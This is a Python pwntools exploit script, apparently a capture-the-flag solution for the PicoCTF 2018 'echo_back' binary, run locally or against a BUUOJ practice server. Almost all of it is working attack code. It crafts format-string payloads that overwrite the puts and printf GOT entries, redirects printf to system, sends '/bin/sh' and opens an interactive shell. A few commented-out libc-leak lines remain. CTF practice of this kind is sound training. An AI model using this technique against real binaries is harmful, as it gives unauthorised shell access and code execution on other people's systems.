import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./PicoCTF_2018_echo_back')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./PicoCTF_2018_echo_back')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',25532)
			elf=ELF('./PicoCTF_2018_echo_back')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		
		io.recv()
		pay1=fmtstr_payload(7,{elf.got['puts']:0x080484b0})
		pay2=fmtstr_payload(22,{elf.got['printf']:elf.plt['system']})
		pay=pay1+'a'+pay2[:16]+'%71c'+pay2[20:]
		io.send(pay)
		io.send('/bin/sh\x00')

		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue